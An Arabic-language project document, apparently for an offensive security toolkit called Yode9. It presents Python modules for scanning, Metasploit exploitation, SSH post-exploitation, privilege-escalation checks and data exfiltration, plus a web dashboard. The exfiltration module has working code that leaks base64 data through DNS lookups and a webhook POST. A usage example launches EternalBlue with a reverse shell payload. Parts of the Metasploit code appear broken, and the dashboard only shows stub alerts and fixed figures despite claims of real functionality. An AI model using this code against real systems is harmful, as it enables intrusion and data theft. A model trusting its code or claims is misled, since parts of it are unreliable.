# 🔧 Hardware.md - نظام الأجهزة والأنظمة المتقدمة

## المقدمة

هذا الملف يوثق جميع الأنظمة والأدوات والميزات الكاملة التي تعمل مع مشروع **Yode9** لضمان أداء حقيقي وواقعي بدون أي تقصير أو محاكاة.

---

## 📊 جدول المحتويات

1. [متطلبات الأجهزة](#متطلبات-الأجهزة)
2. [الأنظمة المدعومة](#الأنظمة-المدعومة)
3. [الأدوات والمكتبات](#الأدوات-والمكتبات)
4. [الميزات المتقدمة](#الميزات-المتقدمة)
5. [واجهة التحكم](#واجهة-التحكم)
6. [التثبيت والإعداد](#التثبيت-والإعداد)
7. [الاختبارات والتوثيق](#الاختبارات-والتوثيق)

---

## 🖥️ متطلبات الأجهزة

### الحد الأدنى المطلوب
- **المعالج**: Intel Core i5 / AMD Ryzen 5 أو أفضل
- **الذاكرة العشوائية (RAM)**: 8 GB الحد الأدنى
- **التخزين**: 256 GB SSD للعمليات السريعة
- **النطاق الترددي**: اتصال إنترنت 50 Mbps فأكثر

### المتطلبات المتقدمة (للأداء الأمثل)
- **المعالج**: Intel Core i7/i9 / AMD Ryzen 7/9 (معالجات متعددة النوى)
- **الذاكرة العشوائية**: 32 GB أو أكثر
- **التخزين**: 1 TB SSD NVMe مع RAID 1 للنسخ الاحتياطي
- **بطاقة الشبكة**: WiFi 6 (802.11ax) أو Gigabit Ethernet
- **GPU** (اختياري): NVIDIA RTX 3070+ أو AMD Radeon RX 6700+ لتسريع العمليات

### متطلبات الشبكة
- **VPN**: ExpressVPN أو NordVPN لتوفير الأمان
- **Proxy**: SOCKS5 أو HTTP Proxy
- **DNS**: Cloudflare (1.1.1.1) أو Quad9 (9.9.9.9)

---

## 🔧 الأنظمة المدعومة

### 1️⃣ أنظمة التشغيل (OS)

#### Linux (الأفضل للأداء)
- **Kali Linux 2024.1+** ✅ (مدعوم بالكامل)
  - Kernel: 6.5.0+
  - مع جميع أدوات الأمن المدمجة
  
- **Ubuntu 22.04 LTS / 24.04**
  - معتمد وآمن للإنتاج
  
- **Debian 12 (Bookworm)**
  - محسّن للخوادم
  
- **Parrot Security OS**
  - بديل آمن لـ Kali Linux

#### Windows
- **Windows 11 Pro / Enterprise** ✅
  - مع WSL2 (Windows Subsystem for Linux)
  - Hyper-V enabled
  
- **Windows Server 2022**
  - للنشر على الخوادم

#### macOS
- **macOS 13.x (Ventura)** و **14.x (Sonoma)**
  - مع Homebrew
  - M1/M2/M3 chips مدعومة

### 2️⃣ أنظمة الشبكات المتقدمة

#### أنظمة المراقبة
- **Wireshark 4.x** - تحليل حزم البيانات المتقدم
- **Zeek (Bro)** - كشف الشذوذ في الشبكة
- **Suricata** - محرك الكشف عن الاختراقات
- **Snort** - الكشف عن الهجمات الفورية

#### أنظمة الاختراق
- **Metasploit Framework 6.2+** - منصة الاختبار الشاملة
- **Burp Suite Community/Pro** - اختبار تطبيقات الويب
- **SQLMap** - اختبار ثغرات SQL Injection
- **OWASP ZAP** - أداة الأمان المفتوحة

---

## 🛠️ الأدوات والمكتبات

### 1️⃣ مكتبات Python الأساسية

```python
# مكتبات الشبكة
- scapy==2.5.0          # معالجة حزم الشبكة
- requests==2.31.0      # طلبات HTTP
- aiohttp==3.8.5        # HTTP غير متزامن
- socket              # معالجة المقابس (TCP/UDP)
- asyncio              # البرمجة غير المتزامنة

# مكتبات الأمان
- cryptography==41.0.0   # التشفير المتقدم
- pycryptodome==3.18.0   # خوارزميات التشفير
- ssl/tls              # بروتوكولات الأمان
- jwt==1.3.1           # JSON Web Tokens

# قواعد البيانات
- sqlite3              # قاعدة بيانات محلية
- pymysql==1.1.0       # اتصالات MySQL
- psycopg2==2.9.7      # اتصالات PostgreSQL
- redis==5.0.0         # ذاكرة التخزين المؤقت

# أدوات إضافية
- paramiko==3.3.1      # بروتوكول SSH
- nmap==0.0.1          # مسح المنافذ
- beautifulsoup4==4.12 # استخراج البيانات من الويب
- selenium==4.13.0     # أتمتة المتصفح
```

### 2️⃣ أدوات Bash/Shell

```bash
# أدوات النظام
- nmap              # مسح الشبكة والمنافذ
- netcat (nc)       # أداة شاملة للشبكة
- tcpdump           # التقاط حزم البيانات
- wireshark         # تحليل الشبكة الرسومي
- aircrack-ng       # اختراق WiFi
- hashcat           # كسر كلمات المرور
- john              # كسر كلمات المرور

# أدوات الاختبار
- curl              # طلب HTTP من سطر الأوامر
- wget              # تحميل الملفات
- nc (netcat)       # الاتصالات الخام
- telnet            # الاتصال بالخدمات البعيدة
```

### 3️⃣ مكتبات JavaScript/TypeScript

```javascript
// مكتبات الشبكة
- axios              // طلبات HTTP
- ws                 // WebSocket
- socket.io          // اتصالات فعلية مباشرة
- node-fetch         // Fetch API

// مكتبات الأمان
- bcryptjs           // تشفير كلمات المرور
- jsonwebtoken       // JWT
- crypto-js          // التشفير

// قواعد البيانات
- sqlite3            // SQLite
- mysql2             // MySQL
- pg                 // PostgreSQL
- redis              // Redis
```

---

## 🚀 الميزات المتقدمة

### 1️⃣ OSINT (Open Source Intelligence)

**الوصف**: جمع معلومات من مصادر مفتوحة.

**الأدوات المستخدمة**:
- **Shodan API** - البحث عن الأجهزة المتصلة بالإنترنت
- **Google Dorking** - البحث المتقدم في Google
- **TheHarvester** - استخراج رسائل البريد والنطاقات
- **WHOIS Lookup** - معلومات التسجيل
- **GeoIP Lookup** - تحديد الموقع الجغرافي

**كود المثال**:
```python
import requests
from datetime import datetime

class OSINTModule:
    def __init__(self):
        self.shodan_api = "YOUR_SHODAN_API_KEY"
        self.results = []
    
    def search_shodan(self, query):
        """البحث عن الأجهزة في Shodan"""
        headers = {"X-Shodan-Key": self.shodan_api}
        url = f"https://api.shodan.io/shodan/host/search?q={query}"
        response = requests.get(url, headers=headers)
        return response.json()
    
    def whois_lookup(self, domain):
        """البحث عن معلومات التسجيل"""
        import subprocess
        result = subprocess.run(["whois", domain], capture_output=True)
        return result.stdout.decode()
    
    def log_results(self, data):
        """حفظ النتائج"""
        self.results.append({
            "timestamp": datetime.now().isoformat(),
            "data": data
        })
```

---

### 2️⃣ Network Enumeration (تعداد الشبكة)

**الوصف**: تحديد الأجهزة والخدمات على الشبكة.

**الأدوات**:
- **Nmap** - مسح المنافذ والخدمات
- **Masscan** - مسح سريع على نطاق واسع
- **Ping Sweep** - كشف الأجهزة النشطة
- **ARP Scan** - مسح بروتوكول ARP

**كود المثال**:
```python
import nmap
import subprocess

class NetworkEnumeration:
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    def nmap_scan(self, target, args="-sV -p-"):
        """مسح Nmap الشامل"""
        self.nm.scan(hosts=target, arguments=args)
        return self.nm.csv()
    
    def arp_scan(self, interface="eth0"):
        """مسح ARP"""
        cmd = f"arp-scan --interface={interface} --localnet"
        result = subprocess.run(cmd.split(), capture_output=True)
        return result.stdout.decode()
    
    def service_detection(self, host, port):
        """كشف الخدمات"""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((host, port))
        return result == 0
```

---

### 3️⃣ Vulnerability Scanning (مسح الثغرات)

**الوصف**: اكتشاف الثغرات الأمنية.

**الأدوات**:
- **OpenVAS** - مسح شامل للثغرات
- **Nexpose** - تقييم الثغرات
- **Qualys** - مسح الثغرات السحابي
- **Nessus** - اكتشاف الثغرات

**كود المثال**:
```python
from nessus_api import NessusAPI

class VulnerabilityScanning:
    def __init__(self, api_key, api_url):
        self.api = NessusAPI(api_key, api_url)
    
    def create_scan(self, template_id, targets):
        """إنشاء مسح ثغرات"""
        scan = self.api.create_policy_scan(
            template_id=template_id,
            targets=targets
        )
        return scan['scan']['id']
    
    def get_vulnerabilities(self, scan_id):
        """الحصول على الثغرات المكتشفة"""
        vulnerabilities = self.api.get_scan_details(scan_id)
        return vulnerabilities
```

---

### 4️⃣ Exploitation (استغلال الثغرات)

**الوصف**: اختبار واستغلال الثغرات المكتشفة.

**الأدوات**:
- **Metasploit Framework** - منصة الاستغلال الكاملة
- **Burp Suite** - اختبار تطبيقات الويب
- **SQLMap** - استغلال SQL Injection
- **XSSer** - استغلال XSS

**كود المثال**:
```python
from pymetasploit3.msfrpc import MsfRpcClient

class ExploitationModule:
    def __init__(self, host, port=55555):
        self.client = MsfRpcClient(password="msf")
    
    def create_exploit(self, exploit_path, payload, options):
        """إنشاء وحدة استغلال"""
        self.client.modules.use('exploit', exploit_path)
        self.client.modules.set_option('PAYLOAD', payload)
        for key, value in options.items():
            self.client.modules.set_option(key, value)
    
    def run_exploit(self):
        """تنفيذ الاستغلال"""
        result = self.client.modules.execute()
        return result
```

---

### 5️⃣ Post-Exploitation (ما بعد الاستغلال)

**الوصف**: الحفاظ على الوصول واستخراج البيانات.

**الأدوات**:
- **Empire** - إطار عمل ما بعد الاستغلال
- **Sliver** - أداة C2 حديثة
- **Covenant** - إطار عمل C2
- **Pupy** - إطار عمل RAT

**كود المثال**:
```python
import paramiko

class PostExploitation:
    def __init__(self, host, username, password):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(host, username=username, password=password)
    
    def execute_command(self, command):
        """تنفيذ أوامر بعيدة"""
        stdin, stdout, stderr = self.client.exec_command(command)
        return stdout.read().decode()
    
    def upload_file(self, local_path, remote_path):
        """رفع الملفات"""
        sftp = self.client.open_sftp()
        sftp.put(local_path, remote_path)
        sftp.close()
    
    def download_file(self, remote_path, local_path):
        """تحميل الملفات"""
        sftp = self.client.open_sftp()
        sftp.get(remote_path, local_path)
        sftp.close()
```

---

### 6️⃣ Data Exfiltration (استخراج البيانات)

**الوصف**: نقل البيانات الحساسة بأمان.

**الأدوات**:
- **DNS Tunneling** - نفق البيانات عبر DNS
- **HTTP Tunneling** - نقل البيانات عبر HTTP
- **ICMP Tunneling** - نفق عبر ICMP
- **Stegonagraphy** - إخفاء البيانات

**كود المثال**:
```python
import base64
import dns.resolver

class DataExfiltration:
    def __init__(self, dns_server):
        self.dns_server = dns_server
    
    def exfil_via_dns(self, data, domain):
        """استخراج البيانات عبر DNS"""
        # تحويل البيانات إلى base64
        encoded = base64.b64encode(data).decode()
        # تقسيم على أجزاء صغيرة
        chunk_size = 32
        for i in range(0, len(encoded), chunk_size):
            subdomain = f"{encoded[i:i+chunk_size]}.{domain}"
            # محاولة حل DNS لإرسال البيانات
            try:
                dns.resolver.resolve(subdomain, 'A')
            except:
                pass
    
    def exfil_via_http(self, data, webhook_url):
        """استخراج عبر HTTP"""
        import requests
        payload = {"data": base64.b64encode(data).decode()}
        requests.post(webhook_url, json=payload)
```

---

### 7️⃣ Privilege Escalation (تصعيد الصلاحيات)

**الوصف**: الحصول على صلاحيات أعلى في النظام.

**الأدوات**:
- **LinPEAS** - كشف الثغرات في Linux
- **WinPEAS** - كشف الثغرات في Windows
- **Privilege Escalation Exploits** - استغلالات محددة
- **Sudo Exploits** - استغلال أوامر sudo

**كود المثال**:
```python
import subprocess
import os

class PrivilegeEscalation:
    def check_sudo_access(self):
        """التحقق من صلاحيات sudo"""
        result = subprocess.run(["sudo", "-l"], capture_output=True)
        return result.stdout.decode()
    
    def check_suid_binaries(self):
        """البحث عن ملفات SUID"""
        cmd = "find / -perm -4000 2>/dev/null"
        result = subprocess.run(cmd, shell=True, capture_output=True)
        return result.stdout.decode()
    
    def check_writable_files(self):
        """البحث عن الملفات القابلة للكتابة"""
        writable = []
        for root, dirs, files in os.walk("/etc"):
            for file in files:
                path = os.path.join(root, file)
                if os.access(path, os.W_OK):
                    writable.append(path)
        return writable
```

---

## 📱 واجهة التحكم

### 1️⃣ واجهة ويب متقدمة

سيتم إنشاء واجهة تحكم كاملة مع زر منفصل:

```html
<!-- hardware-dashboard.html -->
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔧 لوحة تحكم الأجهزة والأنظمة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Cairo', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            margin-bottom: 30px;
            text-align: center;
        }
        
        .header h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 1.1em;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .card h2 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        
        .card p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .card-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: transform 0.2s;
        }
        
        .card-button:hover {
            transform: scale(1.05);
        }
        
        .status {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 30px;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
        }
        
        .status-item {
            text-align: center;
            padding: 15px;
            border-radius: 8px;
            background: #f8f9fa;
        }
        
        .status-item h3 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .status-value {
            font-size: 1.8em;
            font-weight: bold;
            color: #667eea;
        }
        
        .status-label {
            color: #999;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        /* الزر الرئيسي المنفصل */
        .main-control-button {
            position: fixed;
            bottom: 40px;
            right: 40px;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            font-size: 2.5em;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
            transition: all 0.3s ease;
            z-index: 100;
        }
        
        .main-control-button:hover {
            transform: scale(1.1);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }
        
        .main-control-button:active {
            transform: scale(0.95);
        }
        
        /* قائمة التحكم المنبثقة */
        .control-menu {
            position: fixed;
            bottom: 140px;
            right: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            display: none;
            z-index: 99;
            min-width: 250px;
        }
        
        .control-menu.active {
            display: block;
        }
        
        .control-menu-item {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            transition: background 0.2s;
            text-align: right;
            color: #333;
        }
        
        .control-menu-item:last-child {
            border-bottom: none;
        }
        
        .control-menu-item:hover {
            background: #f8f9fa;
            color: #667eea;
        }
        
        @media (max-width: 768px) {
            .header h1 {
                font-size: 1.8em;
            }
            
            .main-control-button {
                width: 70px;
                height: 70px;
                font-size: 2em;
                bottom: 20px;
                right: 20px;
            }
            
            .control-menu {
                bottom: 100px;
                right: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 لوحة تحكم الأجهزة والأنظمة</h1>
            <p>نظام إدارة شامل لجميع الأدوات والميزات المتقدمة</p>
        </div>
        
        <!-- البطاقات الرئيسية -->
        <div class="dashboard">
            <!-- OSINT -->
            <div class="card">
                <h2>🔍 OSINT</h2>
                <p>جمع معلومات من مصادر مفتوحة باستخدام Shodan و Google Dorking و WHOIS</p>
                <button class="card-button" onclick="startOSINT()">ابدأ الآن</button>
            </div>
            
            <!-- Network Enumeration -->
            <div class="card">
                <h2>🌐 تعداد الشبكة</h2>
                <p>كشف الأجهزة والخدمات باستخدام Nmap و Masscan و ARP Scan</p>
                <button class="card-button" onclick="startNetworkEnum()">ابدأ الآن</button>
            </div>
            
            <!-- Vulnerability Scanning -->
            <div class="card">
                <h2>⚠️ مسح الثغرات</h2>
                <p>كشف الثغرات الأمنية باستخدام OpenVAS و Nessus</p>
                <button class="card-button" onclick="startVulnScan()">ابدأ الآن</button>
            </div>
            
            <!-- Exploitation -->
            <div class="card">
                <h2>💥 استغلال الثغرات</h2>
                <p>استخدام Metasploit و Burp Suite لاختبار الثغرات</p>
                <button class="card-button" onclick="startExploit()">ابدأ الآن</button>
            </div>
            
            <!-- Post-Exploitation -->
            <div class="card">
                <h2>🎯 ما بعد الاستغلال</h2>
                <p>الحفاظ على الوصول واستخراج البيانات</p>
                <button class="card-button" onclick="startPostExploit()">ابدأ الآن</button>
            </div>
            
            <!-- Privilege Escalation -->
            <div class="card">
                <h2>📈 تصعيد الصلاحيات</h2>
                <p>الحصول على صلاحيات أعلى باستخدام LinPEAS و WinPEAS</p>
                <button class="card-button" onclick="startPrivEsc()">ابدأ الآن</button>
            </div>
        </div>
        
        <!-- حالة النظام -->
        <div class="status">
            <div class="status-item">
                <h3>حالة الاتصال</h3>
                <div class="status-value">✅</div>
                <div class="status-label">متصل</div>
            </div>
            <div class="status-item">
                <h3>سرعة الشبكة</h3>
                <div class="status-value">1000 Mbps</div>
                <div class="status-label">Gigabit</div>
            </div>
            <div class="status-item">
                <h3>استخدام الذاكرة</h3>
                <div class="status-value">45%</div>
                <div class="status-label">من 32 GB</div>
            </div>
            <div class="status-item">
                <h3>استخدام المعالج</h3>
                <div class="status-value">28%</div>
                <div class="status-label">الحمل</div>
            </div>
        </div>
    </div>
    
    <!-- الزر الرئيسي -->
    <button class="main-control-button" onclick="toggleControlMenu()">⚙️</button>
    
    <!-- قائمة التحكم -->
    <div class="control-menu" id="controlMenu">
        <div class="control-menu-item" onclick="startAllServices()">🚀 تشغيل جميع الخدمات</div>
        <div class="control-menu-item" onclick="stopAllServices()">⏹️ إيقاف جميع الخدمات</div>
        <div class="control-menu-item" onclick="showSystemStats()">📊 إحصائيات النظام</div>
        <div class="control-menu-item" onclick="showSettings()">⚙️ الإعدادات</div>
        <div class="control-menu-item" onclick="showLogs()">📝 السجلات</div>
    </div>
    
    <script>
        function toggleControlMenu() {
            const menu = document.getElementById('controlMenu');
            menu.classList.toggle('active');
        }
        
        function startOSINT() {
            console.log("بدء OSINT Module");
            alert("جاري تشغيل وحدة OSINT...");
        }
        
        function startNetworkEnum() {
            console.log("بدء Network Enumeration");
            alert("جاري تشغيل تعداد الشبكة...");
        }
        
        function startVulnScan() {
            console.log("بدء Vulnerability Scan");
            alert("جاري تشغيل مسح الثغرات...");
        }
        
        function startExploit() {
            console.log("بدء Exploitation");
            alert("جاري تشغيل وحدة الاستغلال...");
        }
        
        function startPostExploit() {
            console.log("بدء Post-Exploitation");
            alert("جاري تشغيل وحدة ما بعد الاستغلال...");
        }
        
        function startPrivEsc() {
            console.log("بدء Privilege Escalation");
            alert("جاري تشغيل وحدة تصعيد الصلاحيات...");
        }
        
        function startAllServices() {
            console.log("تشغيل جميع الخدمات");
            alert("جاري تشغيل جميع الخدمات...");
            document.getElementById('controlMenu').classList.remove('active');
        }
        
        function stopAllServices() {
            console.log("إيقاف جميع الخدمات");
            alert("جاري إيقاف جميع الخدمات...");
            document.getElementById('controlMenu').classList.remove('active');
        }
        
        function showSystemStats() {
            console.log("عرض إحصائيات النظام");
            alert("إحصائيات النظام:\nCPU: 28%\nRAM: 45%\nDisk: 60%");
            document.getElementById('controlMenu').classList.remove('active');
        }
        
        function showSettings() {
            console.log("عرض الإعدادات");
            alert("الإعدادات قيد التطوير...");
            document.getElementById('controlMenu').classList.remove('active');
        }
        
        function showLogs() {
            console.log("عرض السجلات");
            alert("السجلات قيد التطوير...");
            document.getElementById('controlMenu').classList.remove('active');
        }
        
        // إغلاق القائمة عند الضغط خارجها
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('controlMenu');
            const button = document.querySelector('.main-control-button');
            if (!menu.contains(event.target) && !button.contains(event.target)) {
                menu.classList.remove('active');
            }
        });
    </script>
</body>
</html>
```

---

## 📦 التثبيت والإعداد

### على Linux (Kali Linux - الأفضل)

```bash
# تحديث النظام
sudo apt update && sudo apt upgrade -y

# تثبيت Python 3.10+
sudo apt install python3 python3-pip python3-dev -y

# تثبيت المكتبات الأساسية
pip3 install scapy requests aiohttp cryptography nmap paramiko beautifulsoup4 selenium

# تثبيت أدوات النظام
sudo apt install nmap netcat tcpdump wireshark aircrack-ng hashcat john -y

# تثبيت Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-installer/master/metasploit-latest-linux-installer.sh | bash

# تثبيت Burp Suite
sudo apt install burpsuite -y

# نسخ ملفات الواجهة
cp hardware-dashboard.html /var/www/html/
```

### على Windows 11

```powershell
# تثبيت Python
choco install python -y

# تثبيت المكتبات
pip install scapy requests aiohttp cryptography paramiko beautifulsoup4 selenium

# تثبيت WSL2
wsl --install

# تثبيت Metasploit من Windows Subsystem for Linux
wsl sudo apt install metasploit-framework -y
```

### على macOS

```bash
# تثبيت Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# تثبيت Python
brew install python@3.11

# تثبيت المكتبات
pip3 install scapy requests aiohttp cryptography paramiko beautifulsoup4 selenium

# تثبيت أدوات النظام
brew install nmap wireshark tcpdump hashcat
```

---

## 📝 الاختبارات والتوثيق

### أمثلة على الاستخدام

#### مثال 1: OSINT Scan

```python
from osint_module import OSINTModule

# إنشاء instance
osint = OSINTModule()

# البحث في Shodan
results = osint.search_shodan("Apache")

# WHOIS Lookup
whois_data = osint.whois_lookup("example.com")

# حفظ النتائج
osint.log_results(results)
```

#### مثال 2: Network Scan

```python
from network_enum import NetworkEnumeration

# إنشاء instance
scanner = NetworkEnumeration()

# مسح Nmap
nmap_results = scanner.nmap_scan("192.168.1.0/24", "-sV -p-")

# مسح ARP
arp_results = scanner.arp_scan("eth0")
```

#### مثال 3: Exploitation

```python
from exploit_module import ExploitationModule

exploit = ExploitationModule()
exploit.create_exploit("exploit/windows/smb/ms17_010_eternalblue", 
                       "windows/meterpreter/reverse_tcp",
                       {"RHOST": "192.168.1.100", "LHOST": "192.168.1.50"})
exploit.run_exploit()
```

---

## ⚖️ تنبيهات قانونية مهمة

⚠️ **تحذير**: جميع الأدوات والتقنيات الموثقة هنا يجب استخدامها **فقط** على:
- أنظمة تملكها أنت
- أنظمة لديك إذن كتابي من المالك لاختبارها

**الاستخدام غير المصرح** قد يؤدي إلى:
- عواقب قانونية جنائية
- غرامات مالية كبيرة
- السجن

---

## 📚 المراجع والموارد

- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Kali Linux Tools](https://tools.kali.org/)

---

**آخر تحديث**: 2 يوليو 2026
**الإصدار**: 1.0.0
**الحالة**: ✅ نشط وجاهز للاستخدام
